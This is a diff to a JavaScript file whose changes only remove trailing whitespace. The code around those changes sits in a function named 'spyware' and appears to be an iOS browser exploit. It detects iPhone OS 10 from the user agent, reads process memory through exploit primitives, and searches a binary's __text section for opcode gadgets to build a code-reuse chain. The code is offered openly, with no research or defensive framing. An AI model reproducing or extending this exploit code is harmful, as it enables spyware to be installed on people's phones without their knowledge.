@@ -218,7 +218,7 @@ function spyware(stage1, memory, binary)
 
     var opcodes;
     var opcode_libs;
-    
+
     if (/iPhone OS 10_/.test(navigator.userAgent)) {
         print('found iPhone OS 10')
         opcodes = {
@@ -297,7 +297,7 @@ function spyware(stage1, memory, binary)
                             var size = memory.u32(Add(base, o + 0x28))
 
                             // Copy the entire __text region into a Uint32Array for faster processing.
-                            // Previously you could map a Uint32Array over the data, but on i7+ devices 
+                            // Previously you could map a Uint32Array over the data, but on i7+ devices
                             // this caused access violations.
                             // Instead we read the entire region and copy it into a Uint32Array. The
                             // memory.read primitive has a weird limitation where it's only able to read
@@ -309,12 +309,12 @@ function spyware(stage1, memory, binary)
                                 // Check to ensure we don't read out of the region we want
                                 var qty = 4096
                                 if (size - r < qty) {
-                                    qty = size - r 
+                                    qty = size - r
                                 }
                                 var data = memory.read(Add(addr, r), qty)
-                            
+
                                 // Data is an array of single bytes. This code takes four entries
-                                // and converts them into a single 32-bit integer. It then adds it 
+                                // and converts them into a single 32-bit integer. It then adds it
                                 // into the `allData` array at the given index
                                 for (var h = 0; h < qty; h += 4) {
                                     var fourBytes = b2u32(data.slice(h, h + 4))
@@ -325,7 +325,7 @@ function spyware(stage1, memory, binary)
                             // Loop through the entire data map looking for each gadget we need
                             for (var f = 0; f < size && keys.length > 0; f++) {
                                 var op = allData[f]
-                                
+
                                 for (var z = 0; z < keys.length; z++) {
                                     var key = keys[z]
                                     var opcode = opcodes[key]
